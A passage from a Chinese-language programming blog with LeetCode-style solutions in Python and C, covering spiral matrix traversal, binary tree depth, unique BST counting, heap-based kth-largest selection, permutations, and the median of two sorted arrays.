class="built_in">len</span>(self.matrix[<span class="number">0</span>]) <span class="keyword">or</span> (i &gt;= <span class="built_in">len</span>(self.matrix)) <span class="keyword">or</span> (j &lt; <span class="number">0</span>) <span class="keyword">or</span> (i &lt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.matrix[i][j] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(self.matrix[i][j],<span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nextState</span>(<span class="params">self,i,j</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;right&quot;</span>):</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;down&quot;</span>):</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;left&quot;</span>):</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;up&quot;</span>):</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        self.state = self.table[self.state][self.get_col(i,j)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.matrix)*<span class="built_in">len</span>(self.matrix[<span class="number">0</span>])):</span><br><span class="line">            self.nextState(self.i,self.j)</span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;right&quot;</span>):</span><br><span class="line">                self.j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;down&quot;</span>):</span><br><span class="line">                self.i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;left&quot;</span>):</span><br><span class="line">                self.j -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;up&quot;</span>):</span><br><span class="line">                self.i -= <span class="number">1</span></span><br><span class="line">            self.myList.append(self.matrix[self.i][self.j])</span><br><span class="line">            self.matrix[self.i][self.j] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiralOrder</span>(<span class="params">self, matrix: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        test = Automaton(matrix)</span><br><span class="line">        test.start()</span><br><span class="line">        <span class="keyword">return</span> test.myList</span><br></pre></td></tr></table></div></figure>



<p>另一个方法是获取依照层进行遍历，当遍历完一层之后，去掉外层，然后再遍历。</p>
<p><code>(top,left)、(top,right)、(bottom,left)、(bottom,right)</code>为矩阵边界点，每次遍历完一层之后，对相应的结点数据进行增减。</p>

        <h2 id="二叉树最大深度"   >
          <a href="#二叉树最大深度" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树最大深度" class="headerlink" title="二叉树最大深度"></a>二叉树最大深度</h2>
      
        <h3 id="深度优先动态规划"   >
          <a href="#深度优先动态规划" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先动态规划" class="headerlink" title="深度优先动态规划"></a>深度优先动态规划</h3>
      <p>明确一个公式</p>
<p><code>deepth(root) = max(deepth(root.rigth),deepth(root.left)) + 1</code></p>
<p>即每一个二叉树的深度等于其左子树和右子树中的最大深度再加上根节点，然后其左子树和右子树又可以被当作一个新的二叉树来进行获得其深度，类似动态规划的递归写法。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(root <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(self.maxDepth(root.right),self.maxDepth(root.left)) + <span class="number">1</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="不同的二叉搜索树"   >
          <a href="#不同的二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#不同的二叉搜索树" class="headerlink" title="不同的二叉搜索树"></a>不同的二叉搜索树</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209162015127.png" alt="image-20220916201554961"></p>

        <h3 id="动态规划-1"   >
          <a href="#动态规划-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h3>
      <ul>
<li><p>假设G(n)为n个结点的所有二叉搜索树个数</p>
</li>
<li><p>假设f(i)为以i为根节点的所有二叉搜索树个数</p>
</li>
<li><p>那么可以得出</p>
<p><code>G(n)=f(1)+f(2)+f(3)+f(4)+...+f(n)</code></p>
</li>
<li><p>而对于<code>f(i)</code>，有</p>
<p><code>f(i) = G(i-1)*G(n-i)</code></p>
</li>
<li><p>推导得出卡特兰数公式：</p>
<p><code>G(n)=G(0)∗G(n−1)+G(1)∗G(n−2)+...+G(n−1)∗G(0)</code></p>
</li>
<li><p>依据该公式，将每一项的展开</p>
<ul>
<li>G(0) = 1;</li>
<li>G(1) = 1;</li>
<li>G(2) = <code>G(0)∗G(1) + G(1)∗G(0)</code></li>
<li>G(3) = <code>G(0)∗G(2) + G(1) * G(1) + G(2)*G(0)</code></li>
</ul>
</li>
</ul>
<p>依次类推，最开始时需要的元素为G(0)和G(1)可以推导得出其他所有的G(n)，依据卡特兰公式即可得到状态转移方程</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numTrees</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>]*(n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i):</span><br><span class="line">                dp[i] += dp[j]*dp[i-<span class="number">1</span>-j]</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中的第K个最大元素"   >
          <a href="#数组中的第K个最大元素" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中的第K个最大元素" class="headerlink" title="数组中的第K个最大元素"></a>数组中的第K个最大元素</h2>
      
        <h3 id="堆排序"   >
          <a href="#堆排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3>
      
        <h4 id="建堆"   >
          <a href="#建堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#建堆" class="headerlink" title="建堆"></a>建堆</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,&#125;;</span><br></pre></td></tr></table></div></figure>

<p>构建大顶堆，首先依据顺序排列成二叉完全树</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201650690.png" alt="image-20220920165048440"></p>
<p>然后从<code>idx</code>最大的非叶子结点的子树开始，这里就是<code>idx=4</code>，计算方法为一个循环来大概判断</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = heapSize/<span class="number">2</span></span><br></pre></td></tr></table></div></figure>

<p>然后获取取左右子树的根结点，二叉树基本原理</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> leftIdx = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> rightIdx = i * <span class="number">2</span> + <span class="number">2</span>;</span><br></pre></td></tr></table></div></figure>

<p>之后进行判断排序，获取最大的进行交换调整，将大的上移，然后将下移的结点作为一个二叉树根节点继续调整，依次循环</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line"><span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">    maxIdx = leftIdx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">    maxIdx = rightIdx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">    <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">    <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">    maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>完整代码为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxJustHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> rootIdx,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,i,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,&#125;;</span><br><span class="line">    buildMaxHeap(<span class="built_in">array</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>完整过程为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659876.png" alt="image-20220920165930745"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659777.png" alt="image-20220920165959673"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700284.png" alt="image-20220920170022172"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700879.png" alt="image-20220920170058770"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701842.png" alt="image-20220920170115745"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701841.png" alt="image-20220920170141740"></p>
<p>即可完成最终调整</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201703394.png" alt="image-20220920170311277"></p>

        <h3 id="删除"   >
          <a href="#删除" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除" class="headerlink" title="删除"></a>删除</h3>
      <p>之后删除掉<code>K-1</code>个堆顶元素剩下的堆，即可得到第<code>K</code>个大小的元素。但是堆的删除操作也有点复杂，参照<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39642978/article/details/111551332" >(46条消息) 【数据结构】【堆】堆的建立、插入和删除_西西敏的博客-CSDN博客_堆的建立</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>为了将这个节点删除后的空位填补上，首先要将本堆中最后一个元素的值（假设为<code>value</code>）移动到此位置，然后在被删位置处，用此位置当前的值<code>value</code>和此处的父节点、子节点去比较，如果它与父节点的关系破坏了最大（小）堆，则递归调用<code>shiftUp()</code>来修复；如果它与子节点的关系破坏了最大（小）堆，则递归调用<code>shiftDown()</code>来修复。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxJustHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> rootIdx,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,i,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    buildMaxHeap(nums,numsSize);</span><br><span class="line">    <span class="keyword">int</span> heapSize = numsSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; k - <span class="number">1</span> ; i ++)&#123;</span><br><span class="line">        <span class="comment">//int tmp = nums[heapSize-1];</span></span><br><span class="line">        nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">        heapSize -= <span class="number">1</span>;</span><br><span class="line">        maxJustHeap(nums,<span class="number">0</span>,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>








        <h2 id="全排列"   >
          <a href="#全排列" class="heading-link"><i class="fas fa-link"></i></a><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211602552.png" alt="image-20220921160228336"></p>
<p>使用回溯算法解决</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/permutations/solution/hui-su-suan-fa-python-dai-ma-java-dai-ma-by-liweiw/" >回溯算法入门级详解 + 练习（持续更新） - 全排列 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考图解为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211604340.png" alt="image-20220921160419171"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">nums,tmp</span>):</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">not</span> nums):</span><br><span class="line">                res.append(tmp)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                tmpNums = nums[:i] + nums[i+<span class="number">1</span>:]</span><br><span class="line">                tmpTmp = tmp + [nums[i]]</span><br><span class="line">                back(tmpNums,tmpTmp)</span><br><span class="line">        back(nums,[])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>即每次进入回溯时，进入下一轮的可遍历的数组都是上一轮的数组减去当前要进入<code>tmp</code>剩下的数组，在C上可以使用一个<code>int</code>数组<code>vis</code>来代替是否被遍历到了。</p>

        <h2 id="寻找两个有序数组的中位数"   >
          <a href="#寻找两个有序数组的中位数" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找两个有序数组的中位数" class="headerlink" title="寻找两个有序数组的中位数"></a>寻找两个有序数组的中位数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211928342.png" alt="image-20220921192837199"></p>

        <h3 id="归并排序查找"   >
          <a href="#归并排序查找" class="heading-link"><i class="fas fa-link"></i></a><a href="#归并排序查找" class="headerlink" title="归并排序查找"></a>归并排序查找</h3>
      <p>直接归并然后返回中位数的时间复杂度为<code>O(m+n)</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">float</span>:</span></span><br><span class="line">        result = []</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        nums1Len = <span class="built_in">len</span>(nums1)</span><br><span class="line">        nums2Len = <span class="built_in">len</span>(nums2)</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums1Len == <span class="number">0</span>):</span><br><span class="line">                result += nums2</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(nums2Len == <span class="number">0</span>):</span><br><span class="line">                result += nums1</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &lt; nums2[j]):</span><br><span class="line">                result.append(nums1[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(i == nums1Len):</span><br><span class="line">                    result += nums2[j:]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(nums2[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j == nums2Len):</span><br><span class="line">                    result += nums1[i:]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        resultLen = <span class="built_in">len</span>(result)</span><br><span class="line">        <span class="keyword">if</span>(resultLen%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> (result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)-<span class="number">1</span>] + result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)])/<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)]</span><br></pre></td></tr></table></div></figure>


        <h3 id="二分查找"   >
          <a href="#二分查找" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>即寻找两个有序数组排序之后的第k个数，假定如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = (len(a) + len(b))/2			len(a) + len(b)为奇数   	k为中位数索引</span><br><span class="line">k = (len(a) + len(b))/2 + 1		len(a) + len(b)为偶数		k为中位数索引+0.5</span><br></pre></td></tr></table></div></figure>

<p>然后尝试比较<code>a[k/2-1]</code>和<code>b[k/2-1]</code></p>
<ul>
<li><p><code>a[k/2-1] &gt; b[k/2-1]</code>时，比<code>b[k/2-1]</code>小或等于的最多只有<code>(k/2-1)*2=k-2</code>个数，那么该数<code>b[k/2-1]</code>必定不可能是中位数，那么排除<code>b[0:k/2-1]</code></p>
</li>
<li><p><code>a[k/2-1] &lt; b[k/2-1]</code>时，同理，排除<code>a[0:k/2-1]</code></p>
</li>
<li><p><code>a[k/2-1] = b[k/2-1]</code>时，也同理，排除<code>a[0:k/2-1]</code>和<code>b[0:k-2/1]</code></p>
</li>
</ul>

        <h2 id="在排序数组中查找元素的第一个和最后一个位置"   >
          <a href="#在排序数组中查找元素的第一个和最后一个位置" class="heading-link"><i class="fas fa-link"></i></a><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a>在排序数组中查找元素的第一个和最后一个位置</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002103928281.png" alt="image-20221002103928281"></p>

        <h3 id="二分查找-1"   >
          <a href="#二分查找-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>时间复杂度为O(logn)，那么就用二分查找</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span 